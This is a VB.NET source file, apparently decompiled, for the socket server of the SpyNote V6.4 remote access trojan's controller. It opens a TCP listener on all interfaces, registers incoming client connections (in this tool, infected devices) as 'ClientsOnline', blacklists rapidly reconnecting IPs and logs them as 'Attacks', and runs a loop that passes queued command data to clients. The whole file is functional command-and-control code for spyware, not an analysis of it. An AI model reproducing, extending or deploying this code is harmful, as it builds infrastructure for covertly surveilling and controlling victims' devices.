Imports Microsoft.VisualBasic.CompilerServices
Imports System.Net
Imports System.Net.Sockets
Imports System.Threading
Imports SpyNote_V6._4.SN.Sockets.SpyNote.Client
Imports SpyNote_V6._4.SN.SpyNote.Stores
Imports SpyNote_V6._4.SN.SPYXml

Namespace SN.Sockets.SpyNote.Server
    Public Class SocketServer
        Public Listener As TcpListener

        Public ClientsOnline As Collection

        Public RequestData As List(Of PassData)

        Public SpyXml As XMLSettings

        Public Java As UdpClient

        Private strString As String

        Private intInteger As Integer

        Private start As DateTime

        Public Sub New(ParametersInteger As Integer)
            Me.ClientsOnline = New Collection()
            Me.Java = New UdpClient()
            While True
                Dim flag As Boolean = Not Store.ScanPorts(Store.udpPortIsReady)
                If Not flag Then
                    Exit While
                End If
                Store.udpPortIsReady += 1
            End While
            Me.ClientsOnline = New Collection()
            Me.RequestData = New List(Of PassData)()
            Me.SpyXml = My.Forms.MainSpyNote.SpyXml
            Me.Listener = New TcpListener(IPAddress.Any, ParametersInteger)
            Me.Listener.Server.SendTimeout = -1 'Default -1
            Me.Listener.Server.ReceiveTimeout = -1 'Default -1
            Me.Listener.Server.SendBufferSize = 1048576 '512000
            Me.Listener.Server.ReceiveBufferSize = 1048576 '512000
            Me.Listener.Start()
            Me.Listener.BeginAcceptTcpClient(AddressOf Me.Accept, Nothing)
            Dim dz As New Thread(New ThreadStart(AddressOf Me.PassData))
            dz.Start()
            Store.ConnectJava()
        End Sub

        Private Function FilterIP(ParametersString As String) As Boolean
            ' The following expression was wrapped in a checked-statement
            Dim result As Boolean
            Try
                Dim flag As Boolean = Operators.CompareString(Me.strString, ParametersString, False) = 0
                If flag Then
                    Dim flag2 As Boolean = Me.intInteger >= 5
                    If flag2 Then
                        Dim now As DateTime = DateTime.Now
                        Dim flag3 As Boolean = (now - Me.start).Seconds <= 5
                        If flag3 Then
                            Me.intInteger = 0
                            Me.strString = Nothing
                            result = True
                            Return result
                        End If
                        Me.start = DateTime.Now
                        Me.intInteger = 0
                    Else
                        Me.intInteger += 1
                    End If
                Else
                    Me.start = DateTime.Now
                    Me.intInteger = 0
                    Me.strString = ParametersString
                End If
                result = False
            Catch expr_A9 As Exception
                ProjectData.SetProjectError(expr_A9)
                Console.WriteLine(expr_A9)
                result = False
                ProjectData.ClearProjectError()
            End Try
            Return result
        End Function

        Public Sub Accept(ar As IAsyncResult)
            Try
                Dim tcpClient As TcpClient = Me.Listener.EndAcceptTcpClient(ar)
                Dim iPEndPoint As IPEndPoint = CType(tcpClient.Client.RemoteEndPoint, IPEndPoint)
                Dim flag As Boolean = Data.SpyNote.BlackList.Contains(iPEndPoint.Address.ToString())
                If flag Then
                    Try
                        tcpClient.Client.Close()
                    Catch expr_4D As Exception
                        ProjectData.SetProjectError(expr_4D)
                        Console.WriteLine(expr_4D)
                        ProjectData.ClearProjectError()
                    End Try
                Else
                    Dim socketClient As SocketClient = New SocketClient(tcpClient, Me)
                    Try
                        Dim flag2 As Boolean = Conversions.ToBoolean(Me.SpyXml.Reading("value", 2).Trim().ToString())
                        If flag2 Then
                            Dim flag3 As Boolean = Me.FilterIP(iPEndPoint.Address.ToString())
                            Dim flag4 As Boolean = flag3
                            If flag4 Then
                                Data.SpyNote.BlackList.Add(iPEndPoint.Address.ToString())
                                Data.LogsSpyNote(New String() {iPEndPoint.Address.ToString(), socketClient.ClientRemoteAddress, "Attacks!", "Attacks", Nothing, "This IP has been blocked"})
                                Try
                                    tcpClient.Client.Close()
                                Catch expr_116 As Exception
                                    ProjectData.SetProjectError(expr_116)
                                    Console.WriteLine(expr_116)
                                    ProjectData.ClearProjectError()
                                End Try
                                GoTo IL_1F9
                            End If
                        End If
                        socketClient.Client.ReceiveTimeout = 3 * 1000 'Default -1
                        socketClient.Client.SendTimeout = 3 * 1000 'Default -1
                        socketClient.Client.SendBufferSize = 1024 * 32 '512000
                        socketClient.Client.ReceiveBufferSize = 1024 * 32 '512000
                        Dim clientsOnline As Collection = Me.ClientsOnline
                        Dim obj As Object = clientsOnline
                        SyncLock obj
                            Me.ClientsOnline.Add(socketClient, socketClient.ClientRemoteAddress, Nothing, Nothing)
                            Data.LogsSpyNote(New String() {iPEndPoint.Address.ToString(), socketClient.ClientRemoteAddress, "Connected", "NotReady", Nothing, "Connecting"})
                        End SyncLock
                    Catch expr_1E8 As Exception
                        ProjectData.SetProjectError(expr_1E8)
                        Console.WriteLine(expr_1E8)
                        ProjectData.ClearProjectError()
                    End Try
                End If
IL_1F9:
            Catch expr_1FC As Exception
                ProjectData.SetProjectError(expr_1FC)
                Console.WriteLine(expr_1FC)
                ProjectData.ClearProjectError()
            End Try
            Thread.Sleep(1)
            Me.Listener.BeginAcceptTcpClient(AddressOf Me.Accept, Nothing)
        End Sub

        Public Sub PassData()
            Try
                While True
                    Dim passData As PassData = Nothing
                    Dim requestData As List(Of PassData) = Me.RequestData
                    Dim obj As Object = requestData
                    SyncLock obj
                        Dim flag2 As Boolean = Me.RequestData.Count > 0
                        If flag2 Then
                            passData = Me.RequestData(0)
                            Me.RequestData.RemoveAt(0)
                        End If
                    End SyncLock
                    Dim flag3 As Boolean = passData IsNot Nothing
                    If flag3 Then
                        passData.wait = True
                        Data.Data_0(New Object() {passData.client, passData.byte_0})
                    End If
                    Thread.Sleep(1)
                End While
            Catch expr_9E As Exception
                Console.WriteLine(expr_9E)
            End Try
        End Sub
    End Class
End Namespace
